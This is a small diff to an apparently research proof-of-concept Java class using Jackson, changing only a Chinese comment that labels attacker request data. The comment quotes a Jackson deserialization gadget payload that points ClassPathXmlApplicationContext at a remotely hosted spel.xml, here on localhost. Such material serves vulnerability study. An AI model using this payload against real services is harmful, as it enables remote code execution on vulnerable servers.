@@ -13,7 +13,7 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 public class poc {
 	public static void payload() {
 		/*
-		 * 假设攻击者的HTTP请求数据
+		 * 假设是攻击者的恶意JSON请求数据
 		 * ["org.springframework.context.support.ClassPathXmlApplicationContext", "http://127.0.0.1/spel.xml"]
 		 * 
 		 */
